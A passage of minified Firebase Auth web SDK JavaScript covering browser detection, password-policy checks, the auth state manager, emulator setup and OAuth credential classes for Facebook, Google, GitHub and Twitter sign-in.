 */function ug(t){const e=t.toLowerCase();if(e.includes("opera/")||e.includes("opr/")||e.includes("opios/"))return"Opera";if(a0(e))return"IEMobile";if(e.includes("msie")||e.includes("trident/"))return"IE";if(e.includes("edge/"))return"Edge";if(i0(e))return"Firefox";if(e.includes("silk/"))return"Silk";if(u0(e))return"Blackberry";if(c0(e))return"Webos";if(s0(e))return"Safari";if((e.includes("chrome/")||o0(e))&&!e.includes("edge/"))return"Chrome";if(l0(e))return"Android";{const n=/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,r=t.match(n);if((r==null?void 0:r.length)===2)return r[1]}return"Other"}function i0(t=tt()){return/firefox\//i.test(t)}function s0(t=tt()){const e=t.toLowerCase();return e.includes("safari/")&&!e.includes("chrome/")&&!e.includes("crios/")&&!e.includes("android")}function o0(t=tt()){return/crios\//i.test(t)}function a0(t=tt()){return/iemobile/i.test(t)}function l0(t=tt()){return/android/i.test(t)}function u0(t=tt()){return/blackberry/i.test(t)}function c0(t=tt()){return/webos/i.test(t)}function Hd(t=tt()){return/iphone|ipad|ipod/i.test(t)||/macintosh/i.test(t)&&/mobile/i.test(t)}function CC(t=tt()){var e;return Hd(t)&&!!(!((e=window.navigator)===null||e===void 0)&&e.standalone)}function RC(){return $A()&&document.documentMode===10}function h0(t=tt()){return Hd(t)||l0(t)||c0(t)||u0(t)||/windows phone/i.test(t)||a0(t)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function d0(t,e=[]){let n;switch(t){case"Browser":n=ug(tt());break;case"Worker":n=`${ug(tt())}-${t}`;break;default:n=t}const r=e.length?e.join(","):"FirebaseCore-web";return`${n}/JsCore/${$i}/${r}`}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xC{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,n){const r=s=>new Promise((o,l)=>{try{const u=e(s);o(u)}catch(u){l(u)}});r.onAbort=n,this.queue.push(r);const i=this.queue.length-1;return()=>{this.queue[i]=()=>Promise.resolve()}}async runMiddleware(e){if(this.auth.currentUser===e)return;const n=[];try{for(const r of this.queue)await r(e),r.onAbort&&n.push(r.onAbort)}catch(r){n.reverse();for(const i of n)try{i()}catch{}throw this.auth._errorFactory.create("login-blocked",{originalMessage:r==null?void 0:r.message})}}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function kC(t,e={}){return Wi(t,"GET","/v2/passwordPolicy",Wd(t,e))}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const PC=6;class NC{constructor(e){var n,r,i,s;const o=e.customStrengthOptions;this.customStrengthOptions={},this.customStrengthOptions.minPasswordLength=(n=o.minPasswordLength)!==null&&n!==void 0?n:PC,o.maxPasswordLength&&(this.customStrengthOptions.maxPasswordLength=o.maxPasswordLength),o.containsLowercaseCharacter!==void 0&&(this.customStrengthOptions.containsLowercaseLetter=o.containsLowercaseCharacter),o.containsUppercaseCharacter!==void 0&&(this.customStrengthOptions.containsUppercaseLetter=o.containsUppercaseCharacter),o.containsNumericCharacter!==void 0&&(this.customStrengthOptions.containsNumericCharacter=o.containsNumericCharacter),o.containsNonAlphanumericCharacter!==void 0&&(this.customStrengthOptions.containsNonAlphanumericCharacter=o.containsNonAlphanumericCharacter),this.enforcementState=e.enforcementState,this.enforcementState==="ENFORCEMENT_STATE_UNSPECIFIED"&&(this.enforcementState="OFF"),this.allowedNonAlphanumericCharacters=(i=(r=e.allowedNonAlphanumericCharacters)===null||r===void 0?void 0:r.join(""))!==null&&i!==void 0?i:"",this.forceUpgradeOnSignin=(s=e.forceUpgradeOnSignin)!==null&&s!==void 0?s:!1,this.schemaVersion=e.schemaVersion}validatePassword(e){var n,r,i,s,o,l;const u={isValid:!0,passwordPolicy:this};return this.validatePasswordLengthOptions(e,u),this.validatePasswordCharacterOptions(e,u),u.isValid&&(u.isValid=(n=u.meetsMinPasswordLength)!==null&&n!==void 0?n:!0),u.isValid&&(u.isValid=(r=u.meetsMaxPasswordLength)!==null&&r!==void 0?r:!0),u.isValid&&(u.isValid=(i=u.containsLowercaseLetter)!==null&&i!==void 0?i:!0),u.isValid&&(u.isValid=(s=u.containsUppercaseLetter)!==null&&s!==void 0?s:!0),u.isValid&&(u.isValid=(o=u.containsNumericCharacter)!==null&&o!==void 0?o:!0),u.isValid&&(u.isValid=(l=u.containsNonAlphanumericCharacter)!==null&&l!==void 0?l:!0),u}validatePasswordLengthOptions(e,n){const r=this.customStrengthOptions.minPasswordLength,i=this.customStrengthOptions.maxPasswordLength;r&&(n.meetsMinPasswordLength=e.length>=r),i&&(n.meetsMaxPasswordLength=e.length<=i)}validatePasswordCharacterOptions(e,n){this.updatePasswordCharacterOptionsStatuses(n,!1,!1,!1,!1);let r;for(let i=0;i<e.length;i++)r=e.charAt(i),this.updatePasswordCharacterOptionsStatuses(n,r>="a"&&r<="z",r>="A"&&r<="Z",r>="0"&&r<="9",this.allowedNonAlphanumericCharacters.includes(r))}updatePasswordCharacterOptionsStatuses(e,n,r,i,s){this.customStrengthOptions.containsLowercaseLetter&&(e.containsLowercaseLetter||(e.containsLowercaseLetter=n)),this.customStrengthOptions.containsUppercaseLetter&&(e.containsUppercaseLetter||(e.containsUppercaseLetter=r)),this.customStrengthOptions.containsNumericCharacter&&(e.containsNumericCharacter||(e.containsNumericCharacter=i)),this.customStrengthOptions.containsNonAlphanumericCharacter&&(e.containsNonAlphanumericCharacter||(e.containsNonAlphanumericCharacter=s))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class DC{constructor(e,n,r,i){this.app=e,this.heartbeatServiceProvider=n,this.appCheckServiceProvider=r,this.config=i,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new cg(this),this.idTokenSubscription=new cg(this),this.beforeStateQueue=new xC(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION=1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=Y_,this._agentRecaptchaConfig=null,this._tenantRecaptchaConfigs={},this._projectPasswordPolicy=null,this._tenantPasswordPolicies={},this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=i.sdkClientVersion}_initializeWithPersistence(e,n){return n&&(this._popupRedirectResolver=mn(n)),this._initializationPromise=this.queue(async()=>{var r,i;if(!this._deleted&&(this.persistenceManager=await wi.create(this,e),!this._deleted)){if(!((r=this._popupRedirectResolver)===null||r===void 0)&&r._shouldInitProactively)try{await this._popupRedirectResolver._initialize(this)}catch{}await this.initializeCurrentUser(n),this.lastNotifiedUid=((i=this.currentUser)===null||i===void 0?void 0:i.uid)||null,!this._deleted&&(this._isInitialized=!0)}}),this._initializationPromise}async _onStorageEvent(){if(this._deleted)return;const e=await this.assertedPersistence.getCurrentUser();if(!(!this.currentUser&&!e)){if(this.currentUser&&e&&this.currentUser.uid===e.uid){this._currentUser._assign(e),await this.currentUser.getIdToken();return}await this._updateCurrentUser(e,!0)}}async initializeCurrentUserFromIdToken(e){try{const n=await t0(this,{idToken:e}),r=await pn._fromGetAccountInfoResponse(this,n,e);await this.directlySetCurrentUser(r)}catch(n){console.warn("FirebaseServerApp could not login user with provided authIdToken: ",n),await this.directlySetCurrentUser(null)}}async initializeCurrentUser(e){var n;if(qn(this.app)){const o=this.app.settings.authIdToken;return o?new Promise(l=>{setTimeout(()=>this.initializeCurrentUserFromIdToken(o).then(l,l))}):this.directlySetCurrentUser(null)}const r=await this.assertedPersistence.getCurrentUser();let i=r,s=!1;if(e&&this.config.authDomain){await this.getOrInitRedirectPersistenceManager();const o=(n=this.redirectUser)===null||n===void 0?void 0:n._redirectEventId,l=i==null?void 0:i._redirectEventId,u=await this.tryRedirectSignIn(e);(!o||o===l)&&(u!=null&&u.user)&&(i=u.user,s=!0)}if(!i)return this.directlySetCurrentUser(null);if(!i._redirectEventId){if(s)try{await this.beforeStateQueue.runMiddleware(i)}catch(o){i=r,this._popupRedirectResolver._overrideRedirectResult(this,()=>Promise.reject(o))}return i?this.reloadAndSetCurrentUserOrClear(i):this.directlySetCurrentUser(null)}return Y(this._popupRedirectResolver,this,"argument-error"),await this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===i._redirectEventId?this.directlySetCurrentUser(i):this.reloadAndSetCurrentUserOrClear(i)}async tryRedirectSignIn(e){let n=null;try{n=await this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch{await this._setRedirectUser(null)}return n}async reloadAndSetCurrentUserOrClear(e){try{await yl(e)}catch(n){if((n==null?void 0:n.code)!=="auth/network-request-failed")return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)}useDeviceLanguage(){this.languageCode=fC()}async _delete(){this._deleted=!0}async updateCurrentUser(e){if(qn(this.app))return Promise.reject(xr(this));const n=e?at(e):null;return n&&Y(n.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(n&&n._clone(this))}async _updateCurrentUser(e,n=!1){if(!this._deleted)return e&&Y(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),n||await this.beforeStateQueue.runMiddleware(e),this.queue(async()=>{await this.directlySetCurrentUser(e),this.notifyAuthListeners()})}async signOut(){return qn(this.app)?Promise.reject(xr(this)):(await this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&await this._setRedirectUser(null),this._updateCurrentUser(null,!0))}setPersistence(e){return qn(this.app)?Promise.reject(xr(this)):this.queue(async()=>{await this.assertedPersistence.setPersistence(mn(e))})}_getRecaptchaConfig(){return this.tenantId==null?this._agentRecaptchaConfig:this._tenantRecaptchaConfigs[this.tenantId]}async validatePassword(e){this._getPasswordPolicyInternal()||await this._updatePasswordPolicy();const n=this._getPasswordPolicyInternal();return n.schemaVersion!==this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION?Promise.reject(this._errorFactory.create("unsupported-password-policy-schema-version",{})):n.validatePassword(e)}_getPasswordPolicyInternal(){return this.tenantId===null?this._projectPasswordPolicy:this._tenantPasswordPolicies[this.tenantId]}async _updatePasswordPolicy(){const e=await kC(this),n=new NC(e);this.tenantId===null?this._projectPasswordPolicy=n:this._tenantPasswordPolicies[this.tenantId]=n}_getPersistence(){return this.assertedPersistence.persistence.type}_updateErrorMap(e){this._errorFactory=new To("auth","Firebase",e())}onAuthStateChanged(e,n,r){return this.registerStateListener(this.authStateSubscription,e,n,r)}beforeAuthStateChanged(e,n){return this.beforeStateQueue.pushCallback(e,n)}onIdTokenChanged(e,n,r){return this.registerStateListener(this.idTokenSubscription,e,n,r)}authStateReady(){return new Promise((e,n)=>{if(this.currentUser)e();else{const r=this.onAuthStateChanged(()=>{r(),e()},n)}})}async revokeAccessToken(e){if(this.currentUser){const n=await this.currentUser.getIdToken(),r={providerId:"apple.com",tokenType:"ACCESS_TOKEN",token:e,idToken:n};this.tenantId!=null&&(r.tenantId=this.tenantId),await AC(this,r)}}toJSON(){var e;return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:(e=this._currentUser)===null||e===void 0?void 0:e.toJSON()}}async _setRedirectUser(e,n){const r=await this.getOrInitRedirectPersistenceManager(n);return e===null?r.removeCurrentUser():r.setCurrentUser(e)}async getOrInitRedirectPersistenceManager(e){if(!this.redirectPersistenceManager){const n=e&&mn(e)||this._popupRedirectResolver;Y(n,this,"argument-error"),this.redirectPersistenceManager=await wi.create(this,[mn(n._redirectPersistence)],"redirectUser"),this.redirectUser=await this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager}async _redirectUserForId(e){var n,r;return this._isInitialized&&await this.queue(async()=>{}),((n=this._currentUser)===null||n===void 0?void 0:n._redirectEventId)===e?this._currentUser:((r=this.redirectUser)===null||r===void 0?void 0:r._redirectEventId)===e?this.redirectUser:null}async _persistUserIfCurrent(e){if(e===this.currentUser)return this.queue(async()=>this.directlySetCurrentUser(e))}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){var e,n;if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);const r=(n=(e=this.currentUser)===null||e===void 0?void 0:e.uid)!==null&&n!==void 0?n:null;this.lastNotifiedUid!==r&&(this.lastNotifiedUid=r,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,n,r,i){if(this._deleted)return()=>{};const s=typeof n=="function"?n:n.next.bind(n);let o=!1;const l=this._isInitialized?Promise.resolve():this._initializationPromise;if(Y(l,this,"internal-error"),l.then(()=>{o||s(this.currentUser)}),typeof n=="function"){const u=e.addObserver(n,r,i);return()=>{o=!0,u()}}else{const u=e.addObserver(n);return()=>{o=!0,u()}}}async directlySetCurrentUser(e){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?await this.assertedPersistence.setCurrentUser(e):await this.assertedPersistence.removeCurrentUser()}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return Y(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=d0(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}async _getAdditionalHeaders(){var e;const n={"X-Client-Version":this.clientVersion};this.app.options.appId&&(n["X-Firebase-gmpid"]=this.app.options.appId);const r=await((e=this.heartbeatServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getHeartbeatsHeader());r&&(n["X-Firebase-Client"]=r);const i=await this._getAppCheckToken();return i&&(n["X-Firebase-AppCheck"]=i),n}async _getAppCheckToken(){var e;const n=await((e=this.appCheckServiceProvider.getImmediate({optional:!0}))===null||e===void 0?void 0:e.getToken());return n!=null&&n.error&&cC(`Error while retrieving App Check token: ${n.error}`),n==null?void 0:n.token}}function Gd(t){return at(t)}class cg{constructor(e){this.auth=e,this.observer=null,this.addObserver=XA(n=>this.observer=n)}get next(){return Y(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Kd={async loadJS(){throw new Error("Unable to load external scripts")},recaptchaV2Script:"",recaptchaEnterpriseScript:"",gapiScript:""};function bC(t){Kd=t}function VC(t){return Kd.loadJS(t)}function OC(){return Kd.gapiScript}function LC(t){return`__${t}${Math.floor(Math.random()*1e6)}`}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function MC(t,e){const n=jd(t,"auth");if(n.isInitialized()){const i=n.getImmediate(),s=n.getOptions();if(pl(s,e??{}))return i;In(i,"already-initialized")}return n.initialize({options:e})}function FC(t,e){const n=(e==null?void 0:e.persistence)||[],r=(Array.isArray(n)?n:[n]).map(mn);e!=null&&e.errorMap&&t._updateErrorMap(e.errorMap),t._initializeWithPersistence(r,e==null?void 0:e.popupRedirectResolver)}function UC(t,e,n){const r=Gd(t);Y(r._canInitEmulator,r,"emulator-config-failed"),Y(/^https?:\/\//.test(e),r,"invalid-emulator-scheme");const i=!1,s=f0(e),{host:o,port:l}=jC(e),u=l===null?"":`:${l}`;r.config.emulator={url:`${s}//${o}${u}/`},r.settings.appVerificationDisabledForTesting=!0,r.emulatorConfig=Object.freeze({host:o,port:l,protocol:s.replace(":",""),options:Object.freeze({disableWarnings:i})}),zC()}function f0(t){const e=t.indexOf(":");return e<0?"":t.substr(0,e+1)}function jC(t){const e=f0(t),n=/(\/\/)?([^?#/]+)/.exec(t.substr(e.length));if(!n)return{host:"",port:null};const r=n[2].split("@").pop()||"",i=/^(\[[^\]]+\])(:|$)/.exec(r);if(i){const s=i[1];return{host:s,port:hg(r.substr(s.length+1))}}else{const[s,o]=r.split(":");return{host:s,port:hg(o)}}}function hg(t){if(!t)return null;const e=Number(t);return isNaN(e)?null:e}function zC(){function t(){const e=document.createElement("p"),n=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",n.position="fixed",n.width="100%",n.backgroundColor="#ffffff",n.border=".1em solid #000000",n.color="#b50000",n.bottom="0px",n.left="0px",n.margin="0px",n.zIndex="10000",n.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}typeof console<"u"&&typeof console.info=="function"&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."),typeof window<"u"&&typeof document<"u"&&(document.readyState==="loading"?window.addEventListener("DOMContentLoaded",t):t())}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class p0{constructor(e,n){this.providerId=e,this.signInMethod=n}toJSON(){return fn("not implemented")}_getIdTokenResponse(e){return fn("not implemented")}_linkToIdToken(e,n){return fn("not implemented")}_getReauthenticationResolver(e){return fn("not implemented")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Ei(t,e){return gC(t,"POST","/v1/accounts:signInWithIdp",Wd(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const BC="http://localhost";class Lr extends p0{constructor(){super(...arguments),this.pendingToken=null}static _fromParams(e){const n=new Lr(e.providerId,e.signInMethod);return e.idToken||e.accessToken?(e.idToken&&(n.idToken=e.idToken),e.accessToken&&(n.accessToken=e.accessToken),e.nonce&&!e.pendingToken&&(n.nonce=e.nonce),e.pendingToken&&(n.pendingToken=e.pendingToken)):e.oauthToken&&e.oauthTokenSecret?(n.accessToken=e.oauthToken,n.secret=e.oauthTokenSecret):In("argument-error"),n}toJSON(){return{idToken:this.idToken,accessToken:this.accessToken,secret:this.secret,nonce:this.nonce,pendingToken:this.pendingToken,providerId:this.providerId,signInMethod:this.signInMethod}}static fromJSON(e){const n=typeof e=="string"?JSON.parse(e):e,{providerId:r,signInMethod:i}=n,s=zd(n,["providerId","signInMethod"]);if(!r||!i)return null;const o=new Lr(r,i);return o.idToken=s.idToken||void 0,o.accessToken=s.accessToken||void 0,o.secret=s.secret,o.nonce=s.nonce,o.pendingToken=s.pendingToken||null,o}_getIdTokenResponse(e){const n=this.buildRequest();return Ei(e,n)}_linkToIdToken(e,n){const r=this.buildRequest();return r.idToken=n,Ei(e,r)}_getReauthenticationResolver(e){const n=this.buildRequest();return n.autoCreate=!1,Ei(e,n)}buildRequest(){const e={requestUri:BC,returnSecureToken:!0};if(this.pendingToken)e.pendingToken=this.pendingToken;else{const n={};this.idToken&&(n.id_token=this.idToken),this.accessToken&&(n.access_token=this.accessToken),this.secret&&(n.oauth_token_secret=this.secret),n.providerId=this.providerId,this.nonce&&!this.pendingToken&&(n.nonce=this.nonce),e.postBody=Io(n)}return e}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class m0{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ao extends m0{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fn extends Ao{constructor(){super("facebook.com")}static credential(e){return Lr._fromParams({providerId:Fn.PROVIDER_ID,signInMethod:Fn.FACEBOOK_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Fn.credentialFromTaggedObject(e)}static credentialFromError(e){return Fn.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Fn.credential(e.oauthAccessToken)}catch{return null}}}Fn.FACEBOOK_SIGN_IN_METHOD="facebook.com";Fn.PROVIDER_ID="facebook.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Un extends Ao{constructor(){super("google.com"),this.addScope("profile")}static credential(e,n){return Lr._fromParams({providerId:Un.PROVIDER_ID,signInMethod:Un.GOOGLE_SIGN_IN_METHOD,idToken:e,accessToken:n})}static credentialFromResult(e){return Un.credentialFromTaggedObject(e)}static credentialFromError(e){return Un.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthIdToken:n,oauthAccessToken:r}=e;if(!n&&!r)return null;try{return Un.credential(n,r)}catch{return null}}}Un.GOOGLE_SIGN_IN_METHOD="google.com";Un.PROVIDER_ID="google.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class jn extends Ao{constructor(){super("github.com")}static credential(e){return Lr._fromParams({providerId:jn.PROVIDER_ID,signInMethod:jn.GITHUB_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return jn.credentialFromTaggedObject(e)}static credentialFromError(e){return jn.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return jn.credential(e.oauthAccessToken)}catch{return null}}}jn.GITHUB_SIGN_IN_METHOD="github.com";jn.PROVIDER_ID="github.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zn extends Ao{constructor(){super("twitter.com")}static credential(e,n){return Lr._fromParams({providerId:zn.PROVIDER_ID,signInMethod:zn.TWITTER_SIGN_IN_METHOD,oauthToken:e,oauthTokenSecret:n})}static credentialFromResult(e){return zn.credentialFromTaggedObject(e)}static credentialFromError(e){return zn.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthAccessToken:n,oauthTokenSecret:r}=e;if(!n||!r)return null;try{return zn.credential(n,r)}catch{return null}}}zn.TWITTER_SIGN_IN_METHOD="twitter.com";zn.PROVIDER_ID="twitter.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ni{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static async _fromIdTokenResponse(e,n,r,i=!1){const s=await pn._fromIdTokenResponse(e,r,i),o=dg(r);return new Ni({user:s,providerId:o,_tokenResponse:r,operationType:n})}static async _forOperation(e,n,r){await e._updateTokensIfNecessary(r,!0);const i=dg(r);return new Ni({user:e,providerId:i,_tokenResponse:r,operationType:n})}}function dg(t){return t.providerId?t.providerId:"phoneNumber"in t?"phone":null}/**
 * @license
 * Copyright 2020 Google LLC
 *
